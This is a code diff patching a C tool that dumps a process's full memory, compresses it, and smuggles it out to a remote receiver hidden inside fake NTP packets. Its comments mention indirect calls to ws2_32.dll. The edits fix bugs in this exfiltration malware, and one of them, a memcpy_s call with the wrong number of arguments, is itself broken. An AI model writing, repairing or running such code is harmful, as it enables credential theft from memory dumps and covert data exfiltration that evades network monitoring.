@@ -134,6 +134,13 @@ BOOL DumpProcessToMemory(DWORD pid, char **dumpBuffer, size_t *dumpSize) {
     BOOL success = MiniDumpWriteDumpFunc(hProcess, pid, hMapping, MiniDumpWithFullMemory, NULL, NULL, NULL);
     if (success) {
         *dumpBuffer = (char*)malloc(bufferSize);
+        if (!*dumpBuffer) {
+            fUnmapViewOfFile(buffer);
+            fCloseHandle(hMapping);
+            fCloseHandle(hProcess);
+            FreeLibrary(hDbgHelp);
+            return FALSE;
+        }
         if (*dumpBuffer) {
             memcpy(*dumpBuffer, buffer, bufferSize);
             *dumpSize = bufferSize;
@@ -169,7 +176,7 @@ int CompressBuffer(const char *inputBuffer, size_t inputSize, char **compressedB
 void CreateNTPPacket(const unsigned char payload[8], unsigned char packet[48]) {
     memset(packet, 0, 48);
     packet[0] = 0x1B; // LI=0, VN=3, Mode=3
-    memcpy(packet + 40, payload, 8);
+    memcpy_s(packet + 40, payload, 8);
 }
 
 // Envoie un paquet UDP contenant le faux paquet NTP en utilisant les fonctions indirectes de ws2_32.dll
@@ -207,7 +214,7 @@ int SendNTPPacket(const char *target_ip, int target_port, const unsigned char pa
     memset(&addr, 0, sizeof(addr));
     addr.sin_family = AF_INET;
     addr.sin_port = htons(target_port);
-    addr.sin_addr.s_addr = inet_addr(target_ip);
+    InetPton(AF_INET, target_ip, &addr.sin_addr);
 
     unsigned char packet[48];
     CreateNTPPacket(payload, packet);
@@ -334,7 +341,7 @@ int main(void) {
     }
     printf("[+] Compression completed. Compressed size: %zu bytes.\n", compressedSize);
 
-    if (SendCompressedDumpAsNT(target_ip, target_port, compressedBuffer, compressedSize) != 0) {
+    if (SendCompressedDumpAsNTP(target_ip, target_port, compressedBuffer, compressedSize) != 0) {
         printf("[!] Failed to send compressed dump to receiver.\n");
         free(compressedBuffer);
         return 1;
